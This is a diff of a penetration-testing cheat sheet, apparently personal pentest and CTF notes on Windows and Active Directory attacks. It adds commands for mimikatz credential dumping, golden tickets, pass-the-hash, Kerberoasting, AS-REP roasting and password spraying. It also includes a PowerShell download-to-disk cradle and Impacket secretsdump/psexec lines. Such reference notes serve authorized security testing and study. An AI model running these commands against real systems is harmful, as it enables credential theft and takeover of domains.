@@ -20,12 +20,13 @@ ___
 
 - Running an HTTP Server: `python3 -m http.server <PORT>`
 
-- Running an SMB server: `python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
-	+ (Windows) Copy file from SMB server: 
+- [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)
+	+ **Example**: running an SMB server: `python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+		* (Windows) Copy file from SMB server: 
 
-		```cmd
-		copy \\<IP>\kali\<filename> C:\Temp\<filename>
-		```
+			```cmd
+			copy \\<IP>\kali\<filename> C:\Temp\<filename>
+			```
 
 - Generating a reverse shell executable (Windows): 
 
@@ -36,7 +37,7 @@ ___
 - Password cracking: `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
 	+ `-r /usr/share/hashcat/rules/best64.rule` (Rule-based Attack)
 
-- [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)
+___
 
 ## Common services/ports
 
@@ -70,6 +71,8 @@ $ john $USER.john --wordlist=/usr/share/wordlists/rockyou.txt
 	+ **hydra**: `hydra -L $USER_WORDLIST -P $PASSWORD_WORDLIST $TARGET ssh`
 
 ### Port 53 (DNS)
+
+> **TODO**: Explain zone trasnfer
 
 - DNS Zone transfer: `$ dig axfr @$TARGET [domain]`
 
@@ -108,7 +111,7 @@ $ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -x .<ext(s)
 
 `gobuster dns -d $DOMAIN -w $WORDLIST`
 
-3. Bruteforce GET/POST
+3. Bruteforce GET/POST:
 	- `hydra [-L $USER_LIST|-l $USERNAME] [-P $PASSWORD_LIST|-p $PASSWORD] $TARGET [http-get-form|http-post-form] '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` (**WordPress** example)
 		+ `/wp-login.php` has to be replace by `action` value in form
 		+ `log` & `pwd` can be `username` & `password` (it depends on the name attributes values in form)
@@ -120,6 +123,24 @@ $ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -x .<ext(s)
 	- WordPress: `wpscan --url http://$TARGET`
 
 5. Custom wordlist generator: `cewl http://$TARGET`
+
+#### Wordpress (`wpscan`)
+
+- Get an API TOKEN from [wpscan.com](https://wpscan.com/wordpress-security-scanner)
+	+ `export WPSCAN_API_TOKEN=<API_TOKEN>` into `~/.bashrc`
+	+ in `~/.wpscan/scan.yml`:
+
+		```yaml
+		cli_options:
+  			api_token: <API_TOKEN>	
+		```
+
+```bash
+# Enumerating users
+wpscan --url http://<IP>/ --enumerate u
+# Bruteforcing passwords
+wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -t 50
+```
 
 ### Port 139/445 (SMB - Samba)
 
@@ -159,35 +180,6 @@ ___
 
 ## Windows
 
-- [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)
-
-### RDP
-
-```bash
-xfreerdp /u:<USER> /p:<PASS> /v:<IP> /cert:ignore
-
-rdesktop -u <USER> -p <PASS> <IP>:3389
-```
-
-### Port 135 (RPC)
-
-```bash
-rpcclient -U "" $IP
-<empty password>
-rpcclient $> srvinfo       # identify the specific OS version
-rpcclient $> enumdomusers  # display a list of users names defined on the server
-rpcclient $> getdompwinfo  # get SMB password policy
-rpcclient $> querydispinfo # get users info
-```
-
-### Downloading files (alternative to `wget`)
-
-> `c:\Windows\System32\spool\drivers\color\` is a world-writeable directory.
-
-```powershell
-powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE', 'c:\Windows\System32\spool\drivers\color\$FILE')"
-```
-
 ### Shell
 
 - (`gem install evil-winrm`) `evil-winrm -i <ip> -u <username> -p <password>`
@@ -200,17 +192,195 @@ powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:
 *Evil-WinRM* PS C:\> NET USER # list users
 ```
 
-### Kerberos
+### Downloading files (alternative to `wget`)
 
-- `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <distinguishedName>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]`
-- Kerberos 5 AS-REP etype 23 `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`. See [hashcat wiki](https://hashcat.net/wiki/doku.php?id=hashcat) and [**hackndo** - kerberos as-rep roasting (fr)](https://beta.hackndo.com/kerberos-asrep-roasting/)
+> `c:\Windows\System32\spool\drivers\color\` is a world-writeable directory.
 
-___
+> [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)
 
-> _`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`_
+```powershell
+powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE', 'c:\Windows\System32\spool\drivers\color\$FILE')"
+```
 
-1. `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm <domainName>/<admin-user>@<IP>`
-2. `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLMhash> administrator@<IP> cmd.exe`
+### Active directory enumeration
+
+- Enumerate all local accounts: `net user`
+- Enumerate all users in the entire domain: `net user /domain`
+- Enumerate all groups in the entire domain: `net group /domain`
+
+#### `PowerView.ps1`
+
+- Enumerating operating system:
+
+	```powershell
+	Get-NetComputer -FullData | select operatingsystem*
+	```
+
+- Enumerating domain users:
+
+	```powershell
+	Get-NetUser | select cn
+	```
+
+- Enumerating logged-in users:
+
+	```powershell
+	Get-NetLoggedon -ComputerName <COMPUTER_NAME>
+	```
+
+- Enumerating domain groups:
+
+	```powershell
+	Get-NetGroup -GroupName *admin*
+	```
+
+- Enumerating shared folders:
+
+	```powershell
+	Get-WmiObject -class Win32_Share
+	```
+
+- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+- [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+#### `SharpHound` + `Bloodhound`
+
+1. Collecting data with `SharpHound`:
+
+	```powershell
+	C:\> powershell -ep bypass
+	PS C:\> . .\Downloads\SharpHound.ps1 
+	PS C:\> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+	```
+2. Transferring the **loot.zip** folder to our Attacker Machine (`scp`, **smb** &rarr; `copy`, etc.)
+3. Mapping the network with `BloodHound`:
+
+	```bash
+	apt install -y bloodhound
+	# Open a terminal and type the following:
+	neo4j console # default credentials -> neo4j:neo4j
+	# In another terminal, open bloodhound:
+	bloodhound 
+	```
+
+	+ Drag and drop the **loot.zip** folder into Bloodhound in order to import the **.json** files
+
+- [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)
+
+#### Password spraying
+
+```cmd
+.\Rubeus.exe brute /password:<PASSWORD> /noticket
+```
+
+[Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1) can also be used to perform a brute force attack.
+
+### Port 135 (RPC)
+
+```bash
+rpcclient -U "" $IP
+<empty password>
+rpcclient $> srvinfo       # identify the specific OS version
+rpcclient $> enumdomusers  # display a list of users names defined on the server
+rpcclient $> getdompwinfo  # get SMB password policy
+rpcclient $> querydispinfo # get users info
+```
+
+### Port 3389 (RDP)
+
+```bash
+xfreerdp /u:<USER> /p:<PASS> /v:<IP> /cert:ignore
+
+rdesktop -u <USER> -p <PASS> <IP>:3389
+```
+
+### Kerberos (port 88, 484, etc.)
+
+#### Enumerating users
+
+```bash
+./kerbrute userenum --dc <DC> -d <DOMAIN> <USERNAME_WORDLIST_FILENAME>
+```
+
+#### Harvesting tickets
+
+- **Rubeus** (every 30 seconds):
+
+	```cmd
+	.\Rubeus.exe harvest /interval:30
+	```
+
+#### Kerberoasting
+
+> **Kerberoasting** allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
+
+- **Rubeus** (local):
+
+	```cmd
+	.\Rubeus.exe kerberoast
+	```
+
+- **Impacket** (remote):
+	
+	```bash
+	GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request	
+	```
+
+- Cracking Kerberos 5 etype 23 TGS-REP: 
+
+	```bash
+	hashcat -m 13100 -a 0 hash.txt Pass.txt
+	```
+
+#### AS-REP Roasting
+
+> **AS-REP Roasting** dumps the `krbasrep5` hashes of user accounts that have Kerberos pre-authentication disabled.
+
+- **Rubeus** (local => automatically find as-rep roastable users):
+
+	```cmd
+	.\Rubeus.exe asreproast
+	```
+
+- **Impacket** (remote => requires to enumerate as-rep roastable users with `BloodHound` for instance): 
+
+	```bash
+	GetNPUsers.py <Domain>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]
+	```
+
+- Cracking Kerberos 5 AS-REP etype 23 _(Sometimes Need to add `$23` after `$krb5asrep`)_: 
+
+	```bash
+	hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+	```
+
+#### Pass The ticket
+
+> TODO
+
+#### Silver ticket
+
+> TODO
+
+#### Golden ticket (`mimikatz`)
+
+1. Dump the hash and security identifier (SID) of the Kerberos Ticket Granting Ticket account, allowing you to create a golden ticket:
+	
+	```cmd
+	mimikatz # lsadump::lsa /inject /name:krbtgt
+	```
+
+2. Create a golden ticket:
+
+	```cmd
+	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /id:500
+	```
+
+3. Open a new command prompt with elevated privileges to all machines with:
+
+	```cmd
+	mimikatz # misc::cmd 
+	```
 
 ___
 
@@ -218,7 +388,9 @@ ___
 
 > [Windows Privesc notes](https://github.com/amirr0r/notes/blob/master/Windows/Privesc.md)
 
-- Look at your privileges: `woami /priv` (<https://github.com/hatRiot/token-priv>)
+<!-- > _`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`_ -->
+
+- Look at your privileges: `whoami /priv` (<https://github.com/hatRiot/token-priv>)
 	+ **SeImpersonatePrivilege**: impersonate any access tokens which it can obtain (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
 	+ **SeAssignPrimaryPrivilege**: assign an access token to a new process. (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
 	+ **SeBackupPrivilege**: grants **read** access to all objects on the system, regardless of their ACL.
@@ -243,7 +415,6 @@ ___
 		```cmd
 		net start/stop <name>
 		```
-	
 
 	+ querying the configuration of a service:
 
@@ -283,6 +454,7 @@ ___
 				```cmd
 				reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\malicious.exe /f	
 				```
+
 	+ modifying a configuration option of a service:
 
 		```cmd
@@ -310,17 +482,65 @@ ___
 - Check scheduled tasks:
 	+ `schtasks /query /fo LIST /v`
 	+ PowerShell equivalent: 
+		
 		```powershell
 		PS> Get-ScheduledTask| where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 		```
 
-### Tools/links
+- `Mimikatz`:
+	- ask for **SeDebugPrivilege** in order to interact with the LSASS process and processes owned by other accounts (to be executed as administrator):
+
+		```cmd
+		mimikatz # privilege::debug 
+		Privilege '20' OK 
+		```
+
+	- dumping NTLM password hashes:
+
+		```cmd
+		mimikatz # lsadump::lsa /patch
+		```
+
+		* Cracking them with `hashcat` (or [Pass-The-Hash](#shell) directly): `hashcat -m 1000 ntlm-hashes.txt <WORDLIST>` 
+
+	- dumping the credentials of all logged-on users:
+
+		```cmd
+		mimikatz # sekurlsa::logonpasswords
+		```
+
+	- dumping all service tickets of all logged-on users:
+	
+		```cmd
+		mimikatz # sekurlsa::tickets
+		```
+	
+	- download the service ticket with Mimikatz:
+
+		```cmd
+		mimikatz # kerberos::list /export
+		```
+
+	- **overpass the hash** _(turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication)_:
+
+		```cmd
+		mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:PowerShell.exe
+		```
+		
+- Privesc within the domain:
+	+ **PsExec**: `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLM_Hash> <USER>@<IP> cmd.exe`
+	+ Retrieve all of the password hashes that a user account (that is synced with the domain controller) has to offer:
+
+	```bash
+	python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm <domainName>/<username>[:<password>]@<IP>
+	```
+
+### Tools
 
 - [nishang](https://github.com/samratashok/nishang): collection of scripts and payloads which enables usage of PowerShell for offensive security
 - [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
 - [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 
 - [Gist - Windows Privilege Escalation](https://gist.github.com/sckalath/8dacd032b65404ef7411)
-
 - [LOLBAS](https://lolbas-project.github.io/#)
 	+ [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
 - [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
@@ -332,6 +552,15 @@ ___
 - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit): PowerShell Post-Exploitation Framework
 - [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 -->
+
+### Useful links
+
+- [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)
+- [Hackndo - Windows articles](https://beta.hackndo.com/archives/#windows)
+- [Fuzzysecurity - Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
+- [zer1t0 - Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
+- [RedTeam_CheatSheet.ps1](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)
+
 ___
 
 ## Linux
@@ -352,5 +581,7 @@ ___
 
 ## Useful links
 
-- [ swisskyrepo - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
+- [HackTricks](https://book.hacktricks.xyz/)
+- [swisskyrepo - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
 - [THM - What The Shell? (WU)](https://github.com/amirr0r/thm/tree/master/what-the-shell)
+- [Hashcat - Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
